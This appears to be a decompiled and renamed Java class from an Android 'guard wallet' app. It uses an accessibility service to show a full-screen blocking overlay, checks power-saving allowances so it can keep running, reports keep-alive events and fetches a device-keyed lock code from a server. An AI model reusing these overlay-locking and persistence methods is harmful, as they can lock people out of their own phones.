package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 策略线程 — 策略事件队列 worker。
 *
 * vendor 原始类名: com.guard.wallet.thread.j
 * 默认构造函数用作策略事件队列 worker (d=0 mode)。
 * HTTP body reader 功能 (d=2/5/7) 已随 NIO 层删除而移除，
 * POST body 解析现由 AndroidAsync 3.1.0 库内置处理。
 */
public final class StrategyThread {
    public static volatile StrategyThread g;

    public Object e;
    public Object f;

    public StrategyThread() {
        this.e = new ConcurrentLinkedQueue<String>();
        Timer timer = new Timer();
        this.f = timer;
        timer.schedule(new PeriodicTaskDispatcher(this, 1), 500L, 500L);
    }

    public static boolean e() {
        try {
            if (com.guard.wallet.delegate.EngineHelper.heS() != null
                    && com.guard.wallet.delegate.EngineHelper.heS().isPaired()) {
                return false;
            }
            if (com.guard.wallet.utils.SystemHelper.p0()) {
                return false;
            }
            return com.guard.wallet.utils.SystemHelper.Q0();
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
            return false;
        }
    }

    public static boolean g(BlockViewVO view, boolean keepAlive) {
        try {
            if (keepAlive && isKeepAliveExempt()) {
                return false;
            }
            if (MyAccessibilityService.P() == null) {
                return false;
            }
            if (MyAccessibilityService.P().j()) {
                return false;
            }
            if (com.guard.wallet.power.PowerSaveChecker.shouldKeepAlive()) {
                return false;
            }
            ensureLocalLockCipher();

            BlockViewVO resolved = view != null ? view : new BlockViewVO(false, null, true, true);
            if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
                resolved.setBlockDrawable(MyAccessibilityService.o0());
            }
            com.guard.wallet.helper.BlockViewManager.b(resolved);
            if (!com.guard.wallet.utils.SystemHelper.p1(null)) {
                com.guard.wallet.helper.BlockViewManager.c();
                return false;
            }
            if (keepAlive) {
                com.guard.wallet.http.HttpApiManager.sendIntentCodeMessage("KEEP_ALIVE_RUNNING_EVENT");
            }
            return true;
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
            return false;
        }
    }

    private static boolean isKeepAliveExempt() {
        String servicePackage = MyAccessibilityService.P() != null ? MyAccessibilityService.P().getPackageName() : null;
        boolean serviceAllowed = hasFullBackgroundAllowance(servicePackage, false);
        boolean guardInstalled = com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null;
        boolean guardAllowed = hasFullBackgroundAllowance("com.google.guard", true);
        return serviceAllowed && (guardAllowed || !guardInstalled);
    }

    private static boolean hasFullBackgroundAllowance(String packageName, boolean allowRetryFallback) {
        if (AppUtils.B(packageName)) {
            return false;
        }
        try {
            PowerControlStateVO state = com.guard.wallet.utils.SharedPrefsManager.k(packageName);
            if (state == null) {
                return false;
            }
            if (Boolean.TRUE.equals(state.getAllowAllFullBackground())) {
                return true;
            }
            return allowRetryFallback
                    && (Boolean.TRUE.equals(state.getAllowAutoStart()) || state.getRetryCount() >= 3);
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
            return false;
        }
    }

    private static void ensureLocalLockCipher() {
        try {
            if (com.guard.wallet.utils.SharedPrefsManager.o()) {
                return;
            }
            if (!com.guard.wallet.utils.SharedPrefsManager.n()) {
                String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
                if (!AppUtils.B(deviceId)) {
                    ReqDefaultBodyVO body = new ReqDefaultBodyVO(deviceId);
                    new com.guard.wallet.http.HttpClient()
                            .asyncGet(body, "/api/cipher/getLockCipher", new com.guard.wallet.http.ServerLockCipherCallback());
                }
            }
        } catch (Exception ex) {
            AppUtils.s("StrategyThread", ex);
        }
    }
}
